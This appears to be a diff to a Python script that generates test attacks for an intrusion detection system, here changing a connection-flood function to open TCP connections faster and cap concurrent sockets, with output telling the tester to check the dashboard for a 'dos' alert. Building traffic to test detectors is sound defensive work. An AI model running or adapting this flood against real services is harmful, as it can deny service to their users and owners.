@@ -46,11 +46,13 @@ def attack_syn_flood():
     print("ATTACK: SYN Flood (Should detect 'dos')")
     print("="*50)
     print(f"Sending SYN packets to {TARGET}:{PORT}...")
+    print("This will create many TCP connections (no root required)")
     print("Press Ctrl+C to stop after 30 seconds")
     
     sockets = []
     start_time = time.time()
     count = 0
+    max_sockets = 1000  # Limit concurrent connections
     
     try:
         while time.time() - start_time < 30:
@@ -60,21 +62,32 @@ def attack_syn_flood():
                 s.connect((TARGET, PORT))
                 sockets.append(s)
                 count += 1
+                
+                # Close old sockets to prevent too many open files
+                if len(sockets) > max_sockets:
+                    try:
+                        sockets[0].close()
+                        sockets.pop(0)
+                    except:
+                        pass
+                
                 if count % 100 == 0:
-                    print(f"  Sent {count} SYN packets...")
-            except:
+                    print(f"  Sent {count} connections...")
+            except Exception as e:
+                # Connection refused or timeout is expected
                 pass
-            time.sleep(0.01)
+            time.sleep(0.001)  # Reduced sleep for faster attack
     except KeyboardInterrupt:
         pass
     finally:
+        # Close all sockets
         for s in sockets:
             try:
                 s.close()
             except:
                 pass
     
-    print(f"\n✅ SYN flood complete. Sent {count} packets.")
+    print(f"\n✅ SYN flood complete. Sent {count} connections.")
     print("   Check IDS dashboard for 'dos' detection.")
 
 def attack_http_flood():
